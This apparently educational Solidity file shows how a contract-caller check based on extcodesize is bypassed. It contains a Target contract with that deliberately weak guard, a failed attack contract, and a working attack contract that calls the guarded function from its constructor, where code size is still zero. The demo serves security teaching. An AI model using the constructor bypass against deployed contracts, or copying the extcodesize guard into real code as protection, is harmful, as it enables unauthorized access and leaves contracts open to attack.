pragma solidity >= 0.5.0 < 0.9.0;


contract Target 
{
    bool public access=false;

    function isContract(address account)public view returns(bool)
    {
        uint size;
         assembly {
            size:=extcodesize(account)
         }
    return size>0;
    }


    function Protection()external
    {
        require(!isContract(msg.sender),"No Contract Allowed to Call");
        access=true;
    }
}

contract FailedAttack
{
    //these fails because the contract is calling 
    //size>0 which returns true
    //then !true===false
    //therefor not allowed to access
    function attacK(address _target)public 
    {
         Target(_target).Protection();
    }
}

// in constructor any contract size is 0
// after executing constructor size>0
contract SuccesAttack
{
   //Calling in Constructor makes the attack succesfull
   //because in constructor size==0
   //size>0 returns false
   //then !false==true
   //therefore allowed to accees


    constructor(address _target)
    {
        Target(_target).Protection();
    }
}
